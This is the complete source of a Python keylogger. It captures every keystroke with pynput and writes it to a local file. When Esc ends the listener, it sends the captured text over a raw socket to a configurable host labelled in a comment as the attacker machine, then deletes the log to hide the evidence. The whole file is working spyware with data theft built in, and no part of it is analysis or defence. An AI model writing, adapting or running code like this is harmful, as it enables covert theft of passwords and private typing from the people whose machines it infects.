from pynput import keyboard 
import os
import socket

FILENAME = "key.txt" # file to log the key, deleted after connect
HOST = "192.168.1.19" # change this
PORT = 1111 # change this

def connect():
    filesize = os.path.getsize(FILENAME)

    s = socket.socket()
    # print(f"[+] Connecting to {HOST}:{PORT}")
    s.connect((HOST,PORT))
    # print("[+] Connected.")

    # send the filename and filesize
    s.send(f"{FILENAME} {filesize}".encode())
    
    # send the key catched to the server
    with open(FILENAME,"r") as f:
        while True:
            # read the texts from the file
            content = f.read()
            if not content:
            # file transmitting is done
                break
            s.sendall(content.encode())
        # close the socket
        s.close()
    # close the file
    f.close()
    

def on_press(key):
    if key == keyboard.Key.esc:
        # stop the listener
        listener.stop()
        pass

    
def on_release(key):
    try:
        with open("key.txt",'a+') as f:
            # log the special keys
            if key == keyboard.Key.backspace:
                f.write("(Backspace)")
            elif key == keyboard.Key.enter:
                f.write("(Enter)")
            elif key == keyboard.Key.space:
                f.write("(Space)")
            elif key == keyboard.Key.left:
                f.write("(Left Arrow)")
            elif key == keyboard.Key.right:
                f.write("(Right Arrow)")
            elif key == keyboard.Key.up:
                f.write("(Up Arrow)")
            elif key == keyboard.Key.down:
                f.write("(Down Arrow)")
            # log normal key
            else:
                f.write(key.char)
            # force flush the buffer
            f.flush()
            f.close()
    except AttributeError:
        pass

with open("key.txt",'w') as f:
    f.close()
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
# connect to attacker machine
connect()
os.remove(FILENAME)